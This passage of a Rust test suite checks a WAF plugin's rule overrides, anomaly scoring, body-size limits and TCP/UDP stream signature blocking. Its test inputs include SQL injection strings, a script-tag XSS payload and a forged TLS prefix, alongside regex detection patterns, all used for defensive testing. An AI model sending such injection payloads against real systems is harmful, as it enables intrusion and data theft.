        plugin.authorize(&mut outside).await,
        PluginResult::Continue
    ));

    let mut inside = ctx("GET", "/api/users");
    inside.set_raw_query_string("q=union+select+1".into());
    assert!(matches!(
        plugin.authorize(&mut inside).await,
        PluginResult::Reject { .. }
    ));
}

#[tokio::test]
async fn rule_override_can_lower_paranoia_to_reactivate_rule() {
    let plugin = Waf::new(&json!({
        "rule_overrides": { "FE-RFI-001": { "paranoia_min": 1 } }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/redirect");
    ctx.set_raw_query_string("next=https://example.com/x".into());
    let _ = plugin.authorize(&mut ctx).await;
    assert!(monitored(&ctx, "FE-RFI-001"));
}

#[tokio::test]
async fn rule_override_action_enforces_rule() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "rule_overrides": { "FE-SQLI-001": { "action": "enforce" } }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=union+select+1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-SQLI-001")
    );
}

#[tokio::test]
async fn rule_override_action_enforce_monitors_when_global_mode_is_monitor() {
    let plugin = Waf::new(&json!({
        "mode": "monitor",
        "rule_overrides": { "FE-SQLI-001": { "action": "enforce" } }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=union+select+1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("monitored")
    );
    assert!(!ctx.metadata.contains_key("waf.first_blocking_rule"));
}

#[test]
fn unknown_rule_override_id_fails_construction() {
    let err = Waf::new(&json!({
        "rule_overrides": { "FE-NOPE-999": { "paranoia_min": 2 } }
    }))
    .unwrap_err();
    assert!(err.contains("rule_overrides"));
    assert!(err.contains("FE-NOPE-999"));
}

#[test]
fn unknown_rule_override_field_fails_construction() {
    let err = Waf::new(&json!({
        "rule_overrides": { "FE-SQLI-001": { "severty": "critical" } }
    }))
    .unwrap_err();
    assert!(err.contains("unsupported field"));
    assert!(err.contains("severty"));
}

#[tokio::test]
async fn scoring_blocks_on_aggregate_without_any_enforce_rule() {
    // Two monitor-only High hits (5 + 5) cross the threshold of 8. Nothing is
    // set to enforce — the block comes purely from the aggregate score.
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "scoring": { "enabled": true, "block_threshold": 8 }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=<script>union+select+1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("blocked")
    );
    assert_eq!(
        ctx.metadata.get("waf.block_reason").map(String::as_str),
        Some("score")
    );
    assert_eq!(
        ctx.metadata.get("waf.score").map(String::as_str),
        Some("10")
    );
}

#[tokio::test]
async fn scoring_records_but_does_not_block_in_monitor_mode() {
    let plugin = Waf::new(&json!({
        "mode": "monitor",
        "scoring": { "enabled": true, "block_threshold": 1 }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=union+select+1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(ctx.metadata.get("waf.score").map(String::as_str), Some("5"));
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("monitored")
    );
}

#[tokio::test]
async fn scoring_accumulates_across_query_and_body_phases() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "scoring": { "enabled": true, "block_threshold": 8 }
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    ctx.set_raw_query_string("q=union+select+1".into());

    // Query phase scores one High (5) — below the threshold, so it passes.
    let result = plugin.authorize(&mut ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(ctx.metadata.get("waf.score").map(String::as_str), Some("5"));

    // Body phase adds another High (5) → cumulative 10 → blocked.
    let headers = ctx.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            br#"{"c":"<script>alert(1)</script>"}"#,
        )
        .await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata.get("waf.score").map(String::as_str),
        Some("10")
    );
    assert_eq!(
        ctx.metadata.get("waf.block_reason").map(String::as_str),
        Some("score")
    );
}

#[tokio::test]
async fn scoring_ignores_preexisting_public_score_metadata() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "scoring": { "enabled": true, "block_threshold": 8 }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.metadata
        .insert("waf.score".to_string(), "1000".to_string());
    ctx.set_raw_query_string("q=union+select+1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(ctx.metadata.get("waf.score").map(String::as_str), Some("5"));
}

#[tokio::test]
async fn scoring_with_metadata_disabled_uses_private_state() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "log_to_metadata": false,
        "scoring": { "enabled": true, "block_threshold": 8 }
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    ctx.set_raw_query_string("q=union+select+1".into());

    let result = plugin.authorize(&mut ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!ctx.metadata.keys().any(|key| key.starts_with("waf.")));

    let headers = ctx.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            br#"{"c":"<script>alert(1)</script>"}"#,
        )
        .await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(!ctx.metadata.keys().any(|key| key.starts_with("waf.")));
}

#[tokio::test]
async fn on_body_too_large_block_rejects_when_enforcing() {
    // Fail closed: an oversize body that can't be fully scanned is rejected
    // rather than passed through unscanned.
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "max_scan_bytes": 4,
        "on_body_too_large": "block"
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    let headers = ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            b"this body is far larger than four bytes",
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata.get("waf.block_reason").map(String::as_str),
        Some("body_too_large")
    );
    assert_eq!(
        ctx.metadata.get("waf.body_too_large").map(String::as_str),
        Some("true")
    );
}

#[tokio::test]
async fn on_body_too_large_block_in_monitor_mode_does_not_reject() {
    let plugin = Waf::new(&json!({
        "mode": "monitor",
        "max_scan_bytes": 4,
        "on_body_too_large": "block"
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    let headers = ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            b"this body is far larger than four bytes",
        )
        .await;

    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(
        ctx.metadata.get("waf.body_too_large").map(String::as_str),
        Some("true")
    );
}

#[tokio::test]
async fn per_rule_score_override_drives_blocking() {
    // A low-severity rule with an explicit high score blocks on its own.
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "scoring": { "enabled": true, "block_threshold": 8 },
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-SCORE",
            "name": "weighted marker",
            "category": "custom",
            "severity": "low",
            "target": "query_values",
            "match_kind": "contains",
            "pattern": "needle",
            "action": "monitor",
            "score": 9
        }]
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=needle".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(ctx.metadata.get("waf.score").map(String::as_str), Some("9"));
    assert_eq!(
        ctx.metadata.get("waf.block_reason").map(String::as_str),
        Some("score")
    );
}

// ── Stream (TCP/UDP) WAF ─────────────────────────────────────────────────

use ferrum_edge::ConsumerIndex;
use ferrum_edge::config::types::BackendScheme;
use ferrum_edge::plugins::{
    ProxyProtocol, StreamBytesKind, StreamConnectionContext, UdpDatagramContext,
    UdpDatagramDirection, UdpDatagramVerdict, UdpMetadataSink,
};
use std::sync::Arc;

fn stream_ctx(first_bytes: &[u8], kind: StreamBytesKind) -> StreamConnectionContext {
    let mut ctx = StreamConnectionContext::new(
        "203.0.113.10".to_string(),
        "203.0.113.10".to_string(),
        "tcp-proxy".to_string(),
        Some("TCP Proxy".to_string()),
        9000,
        BackendScheme::Tcp,
        Arc::new(ConsumerIndex::new(&[])),
    );
    // `.into()` infers `bytes::Bytes` from the field type — no extra dep.
    ctx.first_bytes = Some(first_bytes.to_vec().into());
    ctx.first_bytes_kind = Some(kind);
    ctx
}

fn udp_ctx(payload: &[u8], kind: StreamBytesKind) -> UdpDatagramContext<'_> {
    UdpDatagramContext {
        client_ip: Arc::from("203.0.113.10"),
        proxy_id: Arc::from("udp-proxy"),
        proxy_name: Some(Arc::from("UDP Proxy")),
        listen_port: 9000,
        datagram_size: payload.len(),
        direction: UdpDatagramDirection::ClientToBackend,
        payload,
        payload_kind: kind,
        metadata_sink: None,
    }
}

fn sig_waf(mode: &str) -> Waf {
    Waf::new(&json!({
        "mode": mode,
        "include_default_rules": false,
        "stream": {
            "signatures": [{
                "id": "STREAM-SQLI-1",
                "pattern": "(?i)union\\s+select",
                "severity": "high",
                "action": "enforce"
            }]
        }
    }))
    .unwrap()
}

/// A raw TCP `StreamConnectionContext` with no captured first bytes — models a
/// peek that timed out or hit EOF before the client sent anything.
fn stream_ctx_absent() -> StreamConnectionContext {
    let mut ctx = stream_ctx_absent_kind(StreamBytesKind::PlaintextWire);
    ctx.first_bytes_kind = None;
    ctx
}

fn stream_ctx_absent_kind(kind: StreamBytesKind) -> StreamConnectionContext {
    let mut ctx = stream_ctx(b"", kind);
    ctx.first_bytes = None;
    ctx.first_bytes_kind = Some(kind);
    ctx
}

fn require_tls_waf(mode: &str) -> Waf {
    Waf::new(&json!({
        "mode": mode,
        "include_default_rules": false,
        "stream": { "tcp_require_tls": true }
    }))
    .unwrap()
}

#[tokio::test]
async fn stream_waf_signature_blocks_plaintext_tcp() {
    let plugin = sig_waf("enforce");
    let mut sctx = stream_ctx(
        b"id=1 UNION SELECT password FROM users",
        StreamBytesKind::PlaintextWire,
    );

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    let md = sctx.metadata.as_ref().expect("metadata set on block");
    assert_eq!(md.get("waf.action").map(String::as_str), Some("blocked"));
    assert_eq!(
        md.get("waf.block_reason").map(String::as_str),
        Some("signature")
    );
    assert_eq!(
        md.get("waf.rule_hits").map(String::as_str),
        Some("STREAM-SQLI-1")
    );
    assert_eq!(md.get("waf.target").map(String::as_str), Some("tcp_stream"));
}

#[tokio::test]
async fn stream_waf_signature_monitor_mode_records_but_allows() {
    let plugin = sig_waf("monitor");
    let mut sctx = stream_ctx(b"id=1 union select 1", StreamBytesKind::PlaintextWire);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Continue));
    let md = sctx.metadata.as_ref().expect("metadata set on monitor");
    assert_eq!(md.get("waf.action").map(String::as_str), Some("monitored"));
    assert!(!md.contains_key("waf.block_reason"));
    // The enforce-action signature would reject under `enforce`, so monitor mode
    // records it as a countable would-block alongside the matched rule ids.
    assert_eq!(
        md.get("waf.would_block_reason").map(String::as_str),
        Some("signature")
    );
}

#[tokio::test]
async fn stream_waf_monitor_action_signature_is_not_a_would_block() {
    // A signature whose own `action` is `monitor` never rejects — not even under
    // global `enforce`. It must record the rule hit but NOT a would-block, so the
    // would-block count reflects only signatures that would actually reject.
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "include_default_rules": false,
        "stream": {
            "signatures": [{
                "id": "STREAM-PROBE-1",
                "pattern": "(?i)union\\s+select",
                "severity": "medium",
                "action": "monitor"
            }]
        }
    }))
    .unwrap();
    let mut sctx = stream_ctx(b"id=1 union select 1", StreamBytesKind::PlaintextWire);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Continue));
    let md = sctx.metadata.as_ref().expect("metadata");
    assert_eq!(md.get("waf.action").map(String::as_str), Some("monitored"));
    assert!(md.contains_key("waf.rule_hits"));
    assert!(!md.contains_key("waf.block_reason"));
    assert!(!md.contains_key("waf.would_block_reason"));
}

#[tokio::test]
async fn stream_waf_scans_decrypted_tls_payload() {
    // DecryptedApp = bytes recovered after the proxy terminated TLS. These are
    // L7-inspectable, so a signature still fires.
    let plugin = sig_waf("enforce");
    let mut sctx = stream_ctx(b"q=1 union select 2", StreamBytesKind::DecryptedApp);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
}

#[tokio::test]
async fn stream_waf_skips_encrypted_passthrough_payload() {
    // EncryptedWire = ciphertext the gateway never decrypts; L7 scanning is
    // meaningless and must not run (no false-positive on encrypted bytes).
    let plugin = sig_waf("enforce");
    let mut sctx = stream_ctx(b"id=1 union select 1", StreamBytesKind::EncryptedWire);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(sctx.metadata.is_none());
}

#[tokio::test]
async fn stream_waf_clean_payload_is_allowed() {
    let plugin = sig_waf("enforce");
    let mut sctx = stream_ctx(b"GET /health HTTP/1.1\r\n", StreamBytesKind::PlaintextWire);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Continue));
}

#[tokio::test]
async fn stream_waf_tcp_require_tls_blocks_non_tls() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "include_default_rules": false,
        "stream": { "tcp_require_tls": true }
    }))
    .unwrap();
    let mut sctx = stream_ctx(b"GET / HTTP/1.1\r\n", StreamBytesKind::PlaintextWire);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    let md = sctx.metadata.as_ref().expect("metadata");
    assert_eq!(
        md.get("waf.block_reason").map(String::as_str),
        Some("tcp_require_tls")
    );
}

#[tokio::test]
async fn stream_waf_tcp_require_tls_allows_client_hello() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "include_default_rules": false,
        "stream": { "tcp_require_tls": true }
    }))
    .unwrap();
    // TLS record: handshake (0x16), version 0x0301.
    let mut sctx = stream_ctx(
        &[0x16, 0x03, 0x01, 0x00, 0x10, 0x01, 0x00, 0x00, 0x0c],
        StreamBytesKind::PlaintextWire,
    );

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Continue));
}

#[tokio::test]
async fn stream_waf_tcp_require_tls_is_noop_after_termination() {
    // On a TLS-terminating frontend the bytes are DecryptedApp; the handshake
    // already proved TLS, so the shape guard must not fire.
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "include_default_rules": false,
        "stream": { "tcp_require_tls": true }
    }))
    .unwrap();
    let mut sctx = stream_ctx(b"GET / HTTP/1.1\r\n", StreamBytesKind::DecryptedApp);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Continue));
}

#[tokio::test]
async fn stream_waf_udp_drops_matching_datagram() {
    let plugin = sig_waf("enforce");
    let verdict = plugin
        .on_udp_datagram(&udp_ctx(
            b"q=1 union select 1",
            StreamBytesKind::PlaintextWire,
        ))
        .await;
    assert_eq!(verdict, UdpDatagramVerdict::Drop);
}

#[tokio::test]
async fn stream_waf_udp_forwards_clean_datagram() {
    let plugin = sig_waf("enforce");
    let verdict = plugin
        .on_udp_datagram(&udp_ctx(b"hello world", StreamBytesKind::PlaintextWire))
        .await;
    assert_eq!(verdict, UdpDatagramVerdict::Forward);
}

#[tokio::test]
async fn stream_waf_udp_skips_encrypted_passthrough() {
    let plugin = sig_waf("enforce");
    let verdict = plugin
        .on_udp_datagram(&udp_ctx(
            b"q=1 union select 1",
            StreamBytesKind::EncryptedWire,
        ))
        .await;
    assert_eq!(verdict, UdpDatagramVerdict::Forward);
}

#[test]
fn stream_waf_attaches_to_stream_protocols_when_configured() {
    let plugin = sig_waf("enforce");
    let protocols = plugin.supported_protocols();
    assert!(protocols.contains(&ProxyProtocol::Tcp));
    assert!(protocols.contains(&ProxyProtocol::Udp));
    assert!(protocols.contains(&ProxyProtocol::Http));
    assert!(plugin.requires_stream_first_bytes());
    // Signatures need decrypted bytes scanned on TLS-terminating frontends.
    assert!(plugin.requires_stream_first_bytes_decrypted());
    assert!(plugin.requires_udp_datagram_hooks());
}

#[test]
fn http_only_waf_does_not_attach_to_stream_protocols() {
    let plugin = Waf::new(&json!({})).unwrap();
    let protocols = plugin.supported_protocols();
    assert!(!protocols.contains(&ProxyProtocol::Tcp));
    assert!(!protocols.contains(&ProxyProtocol::Udp));
    assert!(!plugin.requires_stream_first_bytes());
    assert!(!plugin.requires_udp_datagram_hooks());
}

#[test]
fn stream_waf_rejects_invalid_signature_pattern() {
    let err = Waf::new(&json!({
        "stream": {
            "signatures": [{ "id": "BAD", "pattern": "(unclosed" }]
        }
    }))
    .unwrap_err();
    assert!(
        err.contains("BAD"),
        "error should name the signature: {err}"
    );
}

#[test]
fn stream_waf_require_tls_only_needs_raw_peek_not_decrypted_read() {
    let plugin = require_tls_waf("enforce");
    // Needs the cheap raw peek (to shape-check plain/passthrough bytes)...
    assert!(plugin.requires_stream_first_bytes());
    // ...but NOT the consuming decrypted read: tcp_require_tls is a no-op after
    // TLS termination, so it must not stall a server-first TLS backend.
    assert!(!plugin.requires_stream_first_bytes_decrypted());
    // No signatures → nothing to scan per datagram.
    assert!(!plugin.requires_udp_datagram_hooks());
    // The shape guard inspects the leading TLS record + handshake-type bytes, so
    // it asks the proxy to reassemble that whole prefix before classifying —
    // otherwise a ClientHello split across TCP segments would be misread as a
    // short non-TLS chunk and rejected in enforce mode.
    assert_eq!(plugin.stream_first_bytes_min_len(), 6);
}

#[test]
fn stream_waf_first_bytes_min_len_only_set_for_tls_shape_guard() {
    // Signature scanning has no minimum prefix (it matches whatever opening
    // bytes arrive), so a guard-less stream config keeps the cheap single-peek
    // behavior — a non-zero minimum would needlessly stall protocols whose
    // legitimate opening message is shorter than a TLS record header.
    assert_eq!(sig_waf("enforce").stream_first_bytes_min_len(), 0);
    // An HTTP-only WAF never captures stream first bytes at all.
    assert_eq!(
        Waf::new(&json!({})).unwrap().stream_first_bytes_min_len(),
        0
    );
}

#[tokio::test]
async fn stream_waf_udp_monitor_hit_records_metadata_via_sink() {
    // A UDP signature match must record `waf.*` onto the session metadata sink so
    // the hit rides the stream transaction summary by default (log_to_metadata is
    // on), not only when log_to_stdout is enabled — parity with the TCP path.
    let plugin = sig_waf("monitor");
    let meta = std::sync::Mutex::new(std::collections::HashMap::new());
    let mut ctx = udp_ctx(b"q=1 union select 1", StreamBytesKind::PlaintextWire);
    ctx.metadata_sink = Some(UdpMetadataSink::new(&meta));

    let verdict = plugin.on_udp_datagram(&ctx).await;
    assert_eq!(verdict, UdpDatagramVerdict::Forward); // monitor mode forwards

    let recorded = meta.lock().unwrap();
    assert_eq!(
        recorded.get("waf.target").map(String::as_str),
        Some("udp_stream")
    );
    assert_eq!(
        recorded.get("waf.action").map(String::as_str),
        Some("monitored")
    );
    assert_eq!(
        recorded.get("waf.severity").map(String::as_str),
        Some("high")
    );
    assert!(
        recorded.contains_key("waf.rule_hits"),
        "matched rule ids should be recorded"
    );
    // The enforce-action signature would reject under `enforce`, so monitor mode
    // records the would-block reason for parity with the TCP path.
    assert!(!recorded.contains_key("waf.block_reason"));
    assert_eq!(
        recorded.get("waf.would_block_reason").map(String::as_str),
        Some("signature")
    );
}

#[tokio::test]
async fn stream_waf_udp_enforce_hit_records_blocked_metadata() {
    // An enforced UDP hit drops the datagram AND records a `blocked` action with
    // a block reason, so the drop is not silent in the transaction log.
    let plugin = sig_waf("enforce");
    let meta = std::sync::Mutex::new(std::collections::HashMap::new());
    let mut ctx = udp_ctx(b"q=1 union select 1", StreamBytesKind::PlaintextWire);
    ctx.metadata_sink = Some(UdpMetadataSink::new(&meta));

    let verdict = plugin.on_udp_datagram(&ctx).await;
    assert_eq!(verdict, UdpDatagramVerdict::Drop);

    let recorded = meta.lock().unwrap();
    assert_eq!(
        recorded.get("waf.action").map(String::as_str),
        Some("blocked")
    );
    assert_eq!(
        recorded.get("waf.block_reason").map(String::as_str),
        Some("signature")
    );
    // An actual block carries `block_reason`, never the monitor-only would-block.
    assert!(!recorded.contains_key("waf.would_block_reason"));
}

#[tokio::test]
async fn stream_waf_udp_clean_datagram_records_no_metadata() {
    // No hit → nothing recorded, so clean UDP traffic does not pollute the
    // transaction summary with WAF fields.
    let plugin = sig_waf("monitor");
    let meta = std::sync::Mutex::new(std::collections::HashMap::new());
    let mut ctx = udp_ctx(b"perfectly benign payload", StreamBytesKind::PlaintextWire);
    ctx.metadata_sink = Some(UdpMetadataSink::new(&meta));

    let verdict = plugin.on_udp_datagram(&ctx).await;
    assert_eq!(verdict, UdpDatagramVerdict::Forward);
    assert!(
        meta.lock().unwrap().is_empty(),
        "a clean datagram must record no metadata"
    );
}

#[tokio::test]
async fn stream_waf_udp_metadata_merges_across_datagrams_and_keeps_max_severity() {
    // A session sees many datagrams. Rule ids must accumulate (union) and the
    // recorded severity must be the highest seen — a later, lower-severity hit
    // must not erase the earlier rule id or downgrade the summary (regression for
    // the last-hit-wins behavior).
    let plugin = Waf::new(&json!({
        "mode": "monitor",
        "include_default_rules": false,
        "stream": {
            "signatures": [
                { "id": "HIGH-SQLI", "pattern": "(?i)union\\s+select", "severity": "high" },
                { "id": "LOW-PROBE", "pattern": "(?i)probe", "severity": "low" }
            ]
        }
    }))
    .unwrap();
    let meta = std::sync::Mutex::new(std::collections::HashMap::new());
    let sink = UdpMetadataSink::new(&meta);

    // Datagram 1: high-severity hit.
    let mut c1 = udp_ctx(b"union select", StreamBytesKind::PlaintextWire);
    c1.metadata_sink = Some(sink);
    assert_eq!(
        plugin.on_udp_datagram(&c1).await,
        UdpDatagramVerdict::Forward
    );

    // Datagram 2: only a low-severity hit — must not downgrade severity or drop
    // the earlier rule id.
    let mut c2 = udp_ctx(b"probe", StreamBytesKind::PlaintextWire);
    c2.metadata_sink = Some(sink);
    assert_eq!(
        plugin.on_udp_datagram(&c2).await,
        UdpDatagramVerdict::Forward
    );

    let recorded = meta.lock().unwrap();
    let hits = recorded
        .get("waf.rule_hits")
        .map(String::as_str)
        .unwrap_or("");
    assert!(
        hits.contains("HIGH-SQLI"),
        "earlier rule id retained: {hits}"
    );
    assert!(
        hits.contains("LOW-PROBE"),
        "later rule id accumulated: {hits}"
    );
    assert_eq!(
        recorded.get("waf.severity").map(String::as_str),
        Some("high"),
        "severity must stay at the max seen, not downgrade to the later low hit"
    );
}

#[tokio::test]
async fn stream_waf_signature_fails_closed_when_plaintext_first_bytes_missing() {
    // A client that idles until the first-byte capture deadline must not be
    // allowed to send an unchecked malicious opening payload after relay start.
    let plugin = sig_waf("enforce");
    let mut sctx = stream_ctx_absent_kind(StreamBytesKind::PlaintextWire);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    let md = sctx.metadata.as_ref().expect("metadata");
    assert_eq!(
        md.get("waf.block_reason").map(String::as_str),
        Some("first_bytes_unavailable")
    );
}

#[tokio::test]
async fn stream_waf_signature_fails_closed_when_decrypted_first_bytes_missing() {
    // The TLS-terminated branch: a `read_decrypted_first_bytes` timeout/EOF on a
    // `frontend_tls` proxy yields no application bytes while the transport stays
    // marked `DecryptedApp` (still L7-inspectable). That empty *consuming* read
    // must fail closed in enforce mode just like the plaintext peek, completing
    // the missing-first-bytes matrix.
    let plugin = sig_waf("enforce");
    let mut sctx = stream_ctx_absent_kind(StreamBytesKind::DecryptedApp);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    let md = sctx.metadata.as_ref().expect("metadata");
    assert_eq!(md.get("waf.action").map(String::as_str), Some("blocked"));
    assert_eq!(
        md.get("waf.block_reason").map(String::as_str),
        Some("first_bytes_unavailable")
    );
}

#[tokio::test]
async fn stream_waf_signature_monitor_allows_but_records_when_first_bytes_missing() {
    let plugin = sig_waf("monitor");
    let mut sctx = stream_ctx_absent_kind(StreamBytesKind::DecryptedApp);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Continue));
    let md = sctx.metadata.as_ref().expect("metadata");
    assert_eq!(md.get("waf.action").map(String::as_str), Some("monitored"));
    // Monitor mode never blocks, but the enforce-mode would-block must stay
    // explicitly countable for rollout assessment (no rule_hits to infer from).
    assert!(!md.contains_key("waf.block_reason"));
    assert_eq!(
        md.get("waf.would_block_reason").map(String::as_str),
        Some("first_bytes_unavailable")
    );
}

#[tokio::test]
async fn stream_waf_signature_missing_bytes_still_allows_encrypted_passthrough() {
    // Passthrough bytes are ciphertext and are not L7-inspectable; missing
    // ciphertext must not make stream signatures fail closed. Use
    // tcp_require_tls for passthrough transport-shape enforcement.
    let plugin = sig_waf("enforce");
    let mut sctx = stream_ctx_absent_kind(StreamBytesKind::EncryptedWire);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(sctx.metadata.is_none());
}

#[tokio::test]
async fn stream_waf_monitor_only_signatures_do_not_fail_closed_on_missing_bytes() {
    // Global `enforce` but every signature is `action: monitor`: a present match
    // is allowed (`stream_decision` blocks only enforce-action hits), so missing
    // first bytes must NOT fail closed either — otherwise idle / server-first
    // clients are rejected even though no configured signature could ever block.
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "include_default_rules": false,
        "stream": {
            "signatures": [{
                "id": "STREAM-PROBE-1",
                "pattern": "(?i)union\\s+select",
                "severity": "medium",
                "action": "monitor"
            }]
        }
    }))
    .unwrap();
    let mut sctx = stream_ctx_absent_kind(StreamBytesKind::PlaintextWire);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Continue));
    // No enforce-action signature could block, so nothing is recorded: not a
    // block, not a would-block.
    assert!(sctx.metadata.is_none());
}

#[tokio::test]
async fn stream_waf_mixed_signatures_still_fail_closed_on_missing_bytes() {
    // With at least one enforce-action signature configured, the hidden first
    // bytes could have matched it, so the missing-bytes path must still fail
    // closed under global `enforce` even though a monitor-action signature is
    // also present.
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "include_default_rules": false,
        "stream": {
            "signatures": [
                { "id": "STREAM-PROBE-1", "pattern": "(?i)probe", "action": "monitor" },
                { "id": "STREAM-SQLI-1", "pattern": "(?i)union\\s+select", "action": "enforce" }
            ]
        }
    }))
    .unwrap();
    let mut sctx = stream_ctx_absent_kind(StreamBytesKind::PlaintextWire);

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    let md = sctx.metadata.as_ref().expect("metadata");
    assert_eq!(
        md.get("waf.block_reason").map(String::as_str),
        Some("first_bytes_unavailable")
    );
}

#[tokio::test]
async fn stream_waf_tcp_require_tls_fails_closed_when_no_bytes() {
    // A client that idles until the peek times out (no first bytes) must not
    // slip past a tcp_require_tls port and then send plaintext.
    let plugin = require_tls_waf("enforce");
    let mut sctx = stream_ctx_absent();

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    let md = sctx.metadata.as_ref().expect("metadata");
    assert_eq!(
        md.get("waf.block_reason").map(String::as_str),
        Some("tcp_require_tls")
    );
}

#[tokio::test]
async fn stream_waf_tcp_require_tls_monitor_allows_but_records_when_no_bytes() {
    let plugin = require_tls_waf("monitor");
    let mut sctx = stream_ctx_absent();

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Continue));
    let md = sctx.metadata.as_ref().expect("metadata");
    assert_eq!(md.get("waf.action").map(String::as_str), Some("monitored"));
    assert!(!md.contains_key("waf.block_reason"));
    assert_eq!(
        md.get("waf.would_block_reason").map(String::as_str),
        Some("tcp_require_tls")
    );
}

#[tokio::test]
async fn stream_waf_tcp_require_tls_rejects_forged_tls_prefix() {
    // 0x16 0x03 0x01 record header but handshake type 0x02 (ServerHello), not
    // ClientHello (0x01) — a non-TLS client must not pass by prefixing the bytes.
    let plugin = require_tls_waf("enforce");
    let mut sctx = stream_ctx(
        &[0x16, 0x03, 0x01, 0x00, 0x10, 0x02, 0x00, 0x00, 0x0c],
        StreamBytesKind::PlaintextWire,
    );

    let result = plugin.on_stream_connect(&mut sctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
}

#[tokio::test]
async fn stream_waf_disabled_signature_is_dropped() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "include_default_rules": false,
        "stream": {
            "signatures": [
                { "id": "ON", "pattern": "(?i)attack", "action": "enforce" },
                { "id": "OFF", "pattern": "(?i)union\\s+select", "action": "disabled" }
            ]
        }
    }))
    .unwrap();

    // Matches only the disabled signature → no block, no WAF event.
    let mut sctx = stream_ctx(b"id=1 union select 2", StreamBytesKind::PlaintextWire);
    assert!(matches!(
        plugin.on_stream_connect(&mut sctx).await,
        PluginResult::Continue
    ));
    assert!(
        sctx.metadata.is_none(),
        "disabled signature must not emit WAF events"
    );

    // The enabled signature still blocks.
